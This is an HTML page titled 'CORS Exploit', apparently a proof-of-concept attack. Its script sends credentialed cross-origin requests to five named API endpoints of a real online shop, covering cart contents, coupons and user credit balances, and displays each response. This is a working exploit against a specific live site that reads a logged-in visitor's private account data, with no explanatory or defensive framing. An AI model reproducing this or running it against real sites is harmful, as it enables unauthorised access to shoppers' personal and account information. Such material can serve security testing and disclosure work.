<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CORS Exploit</title>
<style>
body {
    font-family: Arial;
    background: #0f172a;
    color: white;
    padding: 20px;
}
button {
    padding: 10px 20px;
    font-size: 16px;
    background: #22c55e;
    border: none;
    cursor: pointer;
    color: black;
    margin-bottom: 20px;
}
.container {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: 15px;
}
.card {
    padding: 15px;
    border-radius: 10px;
    background: #1e293b;
    box-shadow: 0 0 10px rgba(0,0,0,0.5);
}
.success { border-left: 5px solid #22c55e; }
.fail { border-left: 5px solid #ef4444; }
.loading {
    opacity: 0.6;
}
pre {
    white-space: pre-wrap;
    word-break: break-word;
    font-size: 12px;
}
</style>
</head>
<body>

<h2>CORS Exploit</h2>
<button onclick="runExploit()">Run Exploit</button>

<div class="container" id="results"></div>

<script>
const endpoints = [
    "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
    "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
    "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
    "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
    "https://www.opposhop.cn/cn/oapi/credits/web/credits/show"
];

function createCard(url) {
    const div = document.createElement("div");
    div.className = "card loading";
    div.innerHTML = `
        <b>${url}</b><br>
        Status: Loading...
        <pre></pre>
    `;
    document.getElementById("results").appendChild(div);
    return div;
}

async function fetchData(url) {
    const card = createCard(url);

    try {
        const res = await fetch(url, {
            method: "GET",
            credentials: "include"
        });

        const text = await res.text();

        card.classList.remove("loading");
        card.classList.add(res.status === 200 ? "success" : "fail");

        card.innerHTML = `
            <b>${url}</b><br>
            Status: ${res.status}
            <pre>${text}</pre>
        `;
    } catch (e) {
        card.classList.remove("loading");
        card.classList.add("fail");

        card.innerHTML = `
            <b>${url}</b><br>
            Error
            <pre>${e}</pre>
        `;
    }
}

function runExploit() {
    document.getElementById("results").innerHTML = "";
    endpoints.forEach(fetchData);
}
</script>

</body>
</html>
